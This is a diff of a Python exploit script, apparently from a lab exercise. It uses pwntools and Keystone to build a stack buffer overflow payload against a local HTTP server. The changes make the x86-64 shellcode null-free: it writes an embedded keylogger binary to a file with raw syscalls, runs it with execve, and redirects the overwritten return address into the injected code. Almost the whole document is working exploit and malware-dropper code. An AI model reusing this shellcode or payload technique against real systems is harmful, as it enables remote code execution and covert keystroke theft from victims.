@@ -25,10 +25,7 @@ from pwn import *
 
 ### CONFIGS ###
 port = 8080
-
-message_buffer_start = 0x7ffff75d1ea0
-keylogger_start_address = 0x7ffff75d22d1
-              
+             
 original_rbp = 0x7ffff75d1e20 # the rbp value before the 'ret' instruction executed 
 log_buffer_rbp_offset = 0x450 # the log buffer starts at $original_rbp-0x450
 log_buffer_prefix = 49 # the server already adds 49 bytes at start of the log buffer
@@ -50,64 +47,89 @@ crash += b"\r\n\r\n"
 with open("./scenario_3/keylogger_small", "rb") as file:
   keylogger = file.read()
   
-# Remove all null bytes from the keylogger
+# Get the keylogger
 keylogger = bytes(keylogger)
-keylogger = keylogger.replace(b"\x00", b"")
+
+# Get keylogger length
 keylogger_len = len(keylogger)
 
+added_keylogger_len_bits = 32 - keylogger_len.bit_length()
+added_keylogger_len_bits = added_keylogger_len_bits - (added_keylogger_len_bits % 4)
+
+keylogger_len = '{:b}'.format(keylogger_len)
+keylogger_len_32bit = keylogger_len + '1' * added_keylogger_len_bits
+keylogger_len_32bit = hex(int(keylogger_len_32bit, 2))
+
+# Start address of the keylogger
+keylogger_start_address = 0x7ffff75d22d1
+
+added_keylogger_start_bits = 64 - keylogger_start_address.bit_length()
+added_keylogger_start_bits = added_keylogger_start_bits - (added_keylogger_start_bits % 4)
+
+keylogger_start_address = '{:b}'.format(keylogger_start_address)
+keylogger_start_address_64bit = keylogger_start_address + '1' * added_keylogger_start_bits
+keylogger_start_address_64bit = hex(int(keylogger_start_address_64bit, 2))
+
 # File name
-keylogger_name = b"keylogger"
+keylogger_name = b"./keylogger"
 keylogger_name_len = len(keylogger_name)
-keylogger_name_address = keylogger_start_address - keylogger_len
+placeholder = b"12345678"
+placeholder_len = len(placeholder)
+
+payload_rsp_offset = 0x10 + log_buffer_rbp_offset - log_buffer_prefix - message_prefix_len
 
 # Shell code the runs the keylogger
 shell_code = f"""
-  # Open the file
-  mov rdi, {keylogger_name_address}                # Clear rdi (filename)
-  mov rsi, 0x40              # Argument: O_CREAT | O_WRONLY | O_TRUNC (0644)
-  mov rdx, 0x1FF             # Argument: file permissions (0777)
-  mov rax, 0x2               # Syscall number for open
+  # Create new file
+  lea rdi, [rsp-{payload_rsp_offset}] # ptr to injected "./keylogger"
+  lea rsi, [rsp-{payload_rsp_offset - keylogger_name_len}] # argv: ptr to placeholder (future NULL ptr)
+  lea rdx, [rsp-{payload_rsp_offset - keylogger_name_len}] # envp (= argv)
+  xor rdx, rdx                                # xor nullbytes with itself to make actual 0
+  mov [rsi], rdx  
+  xor rsi, rsi
+  mov sil, 102                                # create file
+  xor rdx, rdx
+  mov dx, 0777                                # set mode
+  mov al, 2 
   syscall
-
-  # Store the file descriptor
-  mov r8, rax
-
+  
+  # Write to the file
+  mov rdi, rax                                # load file descriptor into rdi
+  mov rsi, {keylogger_start_address_64bit}                   # address of data to write
+  shr rsi, {added_keylogger_start_bits}                 # Shift it back to to original length
+  mov edx, {keylogger_len_32bit}                      # length of data
+  shr edx, {added_keylogger_len_bits}          # Shift it back to to original length
+  mov al, 1                                   # system call number for write
+  syscall
+    
   # Close the file
-  xor rdi, rdi               # Clear rdi (file descriptor)
-  mov rax, 0x3               # Syscall number for close
+  mov rdi, rax                                # load file pointer in rdi
+  mov al, 3
   syscall
-
-  # Copy the keylogger from the stack to the file
-  # mov rdi, r8                # File descriptor
-  # lea rsi, {keylogger_start_address} # Pointer to the keylogger
-  # mov rdx, {keylogger_len}   # Length of the keylogger
-  # mov rax, 0x1               # Syscall number for write
-  # syscall
 
   # Execute the keylogger
-  # lea rdi, {keylogger_name_address} # ptr to injected "./keylogger"
-  # lea rsi, {keylogger_name_address - keylogger_name_len} # argv: ptr to placeholder (future NULL ptr)
-  # lea rdx, {keylogger_name_address - keylogger_name_len} # envp (= argv)
-  # put a NULL ptr in the placeholder
-  # xor rax, rax
-  # mov [rdx], rax
-  # perform the execve syscall
-  # mov al, 59
-  # syscall
+  lea rdi, [rsp-{payload_rsp_offset}] # ptr to injected "./keylogger"
+  lea rsi, [rsp-{payload_rsp_offset - keylogger_name_len}] # argv: ptr to placeholder (future NULL ptr)
+  lea rdx, [rsp-{payload_rsp_offset - keylogger_name_len}] # envp (= argv)
+  mov al, 59
+  syscall
 """
+
+print(shell_code)
+
 ks = Ks(KS_ARCH_X86, KS_MODE_64)
 encoding, _ = ks.asm(shell_code)
 
 # build the payload
 sc3_exploit = message_prefix
+sc3_exploit += keylogger_name + placeholder
 sc3_exploit += bytes(encoding) # add assembled shell code
 padding_size = log_buffer_rbp_offset + 8 - log_buffer_prefix - len(sc3_exploit) # len includes the 24 bytes
 sc3_exploit += b"q" * padding_size # add padding
-retaddr = original_rbp - log_buffer_rbp_offset + log_buffer_prefix + message_prefix_len # the new (absolute) return address points to the first byte of the shell code
+retaddr = original_rbp - log_buffer_rbp_offset + log_buffer_prefix + message_prefix_len + keylogger_name_len + placeholder_len # the new (absolute) return address points to the first byte of the shell code
 sc3_exploit += retaddr.to_bytes((retaddr.bit_length() + 7) // 8, byteorder = "little") # add new little endian return address without trailing null bytes
 sc3_exploit += b"\r\n\r\n"
 sc3_exploit += keylogger
-sc3_exploit += keylogger_name 
 
 ### PERFORM ATTACK ###q
 #remote("localhost", port).send(crash) # send crash payload
